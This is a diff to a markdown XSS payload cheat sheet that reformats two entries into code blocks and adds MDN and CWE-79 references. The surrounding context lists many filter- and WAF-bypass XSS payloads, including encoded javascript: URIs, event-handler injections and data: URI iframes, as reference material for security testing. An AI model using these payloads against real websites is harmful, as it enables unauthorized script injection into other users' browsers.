@@ -1089,7 +1089,11 @@ This request will pass through the WAF and an XSS attack will be conducted in ce
 - `<img  src="x:gif" onerror="window['al\u0065rt'](0)"></img>`
 - `<iframe/src="data:text/html,<svg onload=alert(1)>">`
 - `<meta content="&NewLine; 1 &NewLine;; JAVASCRIPT&colon; alert(1)" http-equiv="refresh"/>`
-- `<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script`
+
+```html
+<svg><script xlink:href=data&colon;,window.open('https://www.google.com/')></script
+```
+
 - `<meta http-equiv="refresh" content="0;url=javascript:confirm(1)">`
 - `<iframe src=javascript&colon;alert&lpar;document&period;location&rpar;>`
 - `<form><a href="javascript:\u0061lert(1)">X`
@@ -1100,7 +1104,11 @@ This request will pass through the WAF and an XSS attack will be conducted in ce
 
 - `<img src="/" =_=" title="onerror='prompt(1)'">`
 - `<a aa aaa aaaa aaaaa aaaaaa aaaaaaa aaaaaaaa aaaaaaaaa aaaaaaaaaa href=j&#97v&#97script:&#97lert(1)>ClickMe`
-- `<script x> alert(1) </script 1=2`
+
+```html
+<script x> alert(1) </script 1=2
+```
+
 - `<form><button formaction=javascript&colon;alert(1)>CLICKME`
 - `<input/onmouseover="javaSCRIPT&colon;confirm&lpar;1&rpar;"`
 - `<iframe src="data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E"></iframe>`
@@ -1126,3 +1134,8 @@ The payload should include leading and trailing backticks:
 ```js
 &#96;`${alert``}`&#96;
 ```
+
+## References
+
+- [MDN: Cross-Site Scripting (XSS)](https://developer.mozilla.org/en-US/docs/Web/Security/Attacks/XSS)
+- [CWE-79: Improper Neutralization of Input During Web Page Generation](https://cwe.mitre.org/data/definitions/79.html)
